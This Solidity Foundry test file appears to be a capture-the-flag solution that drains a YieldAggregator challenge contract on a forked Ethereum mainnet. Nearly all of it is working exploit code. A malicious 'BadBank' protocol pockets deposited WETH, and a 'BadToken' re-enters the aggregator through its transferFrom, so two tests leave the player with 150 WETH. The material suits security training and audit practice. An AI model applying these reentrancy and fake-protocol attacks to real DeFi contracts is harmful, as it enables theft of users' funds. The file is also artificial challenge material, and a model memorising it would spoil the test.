pragma solidity 0.8.0;

import "../src/yield_aggregator/YieldAggregator.sol";
import "forge-std/Test.sol";

// dumb bank with 0% interest rates
contract MiniBank is Protocol {
    ERC20Like public override underlying = ERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    mapping (address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(uint256 amount) public override {
        require(underlying.transferFrom(msg.sender, address(this), amount));
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }

    function burn(uint256 amount) public override {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        require(underlying.transfer(msg.sender, amount));
    }

    function balanceUnderlying() public override view returns (uint256) {
        return underlying.balanceOf(address(this));
    }

    function rate() public override view returns (uint256) {
        return 1;
    }
}

interface WETH9 is ERC20Like {
    function deposit() external payable;
}

contract BadBank is MiniBank {
    function flush(ERC20Like token) external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}

contract BadToken {
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Protocol bank;
    YieldAggregator target;
    mapping(address => uint256) private _balances;
    bool flag;

    constructor(Protocol _bank, YieldAggregator _target) {
        bank = _bank;
        target = _target;
    }

    function balanceOf(address user) external view returns(uint256) {
        return _balances[user];
    }

    function approve(address guy, uint256 wad) external returns (bool) {
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns(bool) {
        if(flag) return true;

        weth.approve(address(target), type(uint256).max);

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;

        target.deposit(bank, _tokens, _amounts);
        flag = true;
        return true;
    }

    function attack() public {
        address[] memory _tokens = new address[](2);
        _tokens[0] = address(this);
        _tokens[1] = address(weth);
        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 1;
        _amounts[1] = 50 ether;
        target.deposit(Protocol(address(bank)), _tokens, _amounts);

        _tokens = new address[](1);
        _tokens[0] = address(weth);
        _amounts = new uint256[](1);
        _amounts[0] = 150 ether;
        target.withdraw(Protocol(address(bank)), _tokens, _amounts);
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
}

contract Exploit is Test {
    YieldAggregator public aggregator;
    MiniBank public bank;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address player = address(0xBaDa55);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");
        bank = new MiniBank();

        aggregator = new YieldAggregator();

        weth.deposit{value: 50 ether}();
        weth.approve(address(aggregator), type(uint256).max);

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;

        // we deposit 50 weth to the system
        aggregator.deposit(Protocol(address(bank)), _tokens, _amounts);

        // you managed to get a 100 ether flashloan
        vm.deal(player, 100 ether);
    }

    function isSolved() public view returns (bool) {
        return weth.balanceOf(address(aggregator)) == 0 &&
            weth.balanceOf(address(bank)) == 0;
    }

    function testAggregatorExploit0() public {
        BadBank bandit = new BadBank();

        vm.startPrank(player);
        weth.deposit{value: 100 ether}();
        weth.approve(address(aggregator), type(uint256).max);

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 10 ether;

        for(uint256 i = 0; i < 5; ++i) {
            aggregator.deposit(bandit, _tokens, _amounts);
            bandit.flush(weth);
            aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts);
        }

        assert(isSolved());
        assert(weth.balanceOf(player) == 150 ether);
    }

    function testAggregatorExploit1() public {
        BadToken bandit = new BadToken(bank, aggregator);

        deal(address(bandit), player, 1);
        vm.startPrank(player);
        weth.deposit{value: 100 ether}();
        weth.approve(address(aggregator), type(uint256).max);
        weth.transfer(address(bandit), 100 ether);

        bandit.attack();

        assert(isSolved());
        assert(weth.balanceOf(player) == 150 ether);
    }
}
